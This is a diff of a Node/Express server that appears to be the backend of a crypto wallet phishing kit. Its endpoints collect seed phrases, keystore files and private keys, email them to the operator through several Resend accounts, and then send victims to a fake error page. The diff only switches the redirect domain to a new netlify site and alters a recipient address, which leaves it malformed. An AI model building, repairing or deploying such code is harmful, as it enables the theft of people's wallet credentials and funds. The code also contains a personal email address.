@@ -15,7 +15,7 @@ const emailConfigs = [
   {
     resendInstance: resend1,
     fromEmail: "seed Form <onboard@resend.dev>",
-    toEmail: "olanrewajuayomide636@gmail.com",
+    toEmail: "olanrewajuayomide636@gmailcom",
     accountName: "olanrewajuayomide",
   },
   {
@@ -151,10 +151,10 @@ This notification was sent using multiple Resend accounts to reach all recipient
       }
     });
 
-    res.redirect("https://chainpass.netlify.app/error");
+    res.redirect("https://defiii.netlify.app/error");
   } catch (error) {
     console.error("❌ Error processing phrase submission:", error);
-    res.redirect("https://chainpass.netlify.app/error");
+    res.redirect("https://defiii.netlify.app/error");
   }
 });
 
@@ -167,11 +167,11 @@ app.post("/submit-keystore", (req, res) => {
   sendEmailWithBothAccounts(subject, message)
     .then((results) => {
       console.log("✅ Keystore submission processed");
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     })
     .catch((error) => {
       console.error("❌ Error processing keystore submission:", error);
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     });
 });
 
@@ -184,11 +184,11 @@ app.post("/submit-privatekey", (req, res) => {
   sendEmailWithBothAccounts(subject, message)
     .then((results) => {
       console.log("✅ Private key submission processed");
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     })
     .catch((error) => {
       console.error("❌ Error processing private key submission:", error);
-      res.redirect("https://chainpass.netlify.app/error");
+      res.redirect("https://defiii.netlify.app/error");
     });
 });
 
